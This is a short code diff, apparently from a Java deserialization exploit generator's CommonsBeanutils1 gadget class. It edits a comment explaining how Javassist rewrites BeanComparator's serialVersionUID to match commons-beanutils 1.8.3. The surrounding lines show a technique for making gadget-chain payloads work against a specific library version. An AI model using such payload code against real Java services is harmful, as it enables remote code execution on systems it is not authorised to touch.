@@ -26,7 +26,7 @@ public class CommonsBeanutils1_183 implements ObjectPayload {
             CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
             ctBeanComparator.removeField(ctSUID);
         }catch (javassist.NotFoundException e){}
-        // 与 commons-beanutils 1.8.3 的 BeanComparator.serialVersionUID 一致（勿用 1.9.2 的 -2044202215314119608L）
+        // commons-beanutils 1.8.3 BeanComparator serialVersionUID = -3490850999041592962（编译 classpath 是 1.9.2，其 UID 为 -2044202215314119608）
         ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
         final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
         ctBeanComparator.defrost();
